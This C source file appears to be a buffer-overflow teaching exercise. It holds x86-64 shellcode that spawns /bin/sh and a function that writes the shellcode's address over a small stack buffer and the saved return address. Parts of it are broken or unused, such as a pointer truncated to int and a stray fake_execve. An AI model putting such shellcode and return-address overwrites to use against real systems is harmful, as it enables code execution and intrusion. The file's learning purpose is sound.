#include <stdio.h>
#include <string.h>


char shellcode[] = "\xeb\x0e\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xed\xff\xff\xff/bin/sh";

char large_string[1024];

void fake_execve(const char *filename, char *const argv[],char *const envp[])
{
	asm("mov $0x3b, %eax \n"
		"syscall");
	return ;
}
unsigned long *long_ptr;

void func()
{	
	unsigned long *ret;
	char buffer[16];
	unsigned long i;


	printf("%x %x %x \n",(unsigned long)&ret, (unsigned long)&i , (unsigned long)buffer);
	 long_ptr = (unsigned long *) buffer;

	for(i = 0; i < 6; i++)
	{	
		*( long_ptr + i) = (int)shellcode;	
	}


	ret = (unsigned long *)&ret + 2;
	return;
}
void main()
{	

	unsigned long  *ret;
	printf("calling func \n");
	func();
	printf("finish func \n");
	return; 
}
